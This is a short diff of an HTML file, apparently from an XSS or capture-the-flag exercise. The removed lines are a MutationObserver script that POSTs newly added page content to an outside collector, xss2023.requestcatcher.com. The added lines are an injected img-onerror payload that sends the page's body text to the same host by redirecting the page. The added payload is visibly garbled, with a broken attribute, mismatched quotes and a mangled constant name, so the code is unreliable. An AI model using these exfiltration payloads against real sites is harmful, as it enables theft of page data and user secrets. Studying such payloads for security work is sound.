@@ -1,26 +1,6 @@
-<html>
-
-<head></head>
-<body>
-
-
-</body>
-<script type="text/javascript">
-const callback = (list, observer) => {
-    for(const mu of list) {
-        if (mu.type == 'childList') {
-            let data = mu.addedNodes[0]
-            console.log(data.outerHTML)
-            fetch('https://xss2023.requestcatcher.com/test', {
-                method: 'POST',
-                body: data.outerHTML
-            })
-        }
-    }
-}
-const conf = {childList: true}
-window.onload = function() {
-    let ob = new MutationObserver(callback).observe(document.body, conf)
-}
+<title>HELLO</title>
+<script>
+document.title =
+<img src=x onerror-"document.location = "https://xss2023.requestcatcher.com/+ document.evaluate( "html/body/text() ', document, null, XPathResult.FIRST ORDERED NODE TYPE,
+null).singleNodevalue.data"
 </script>
-</html>
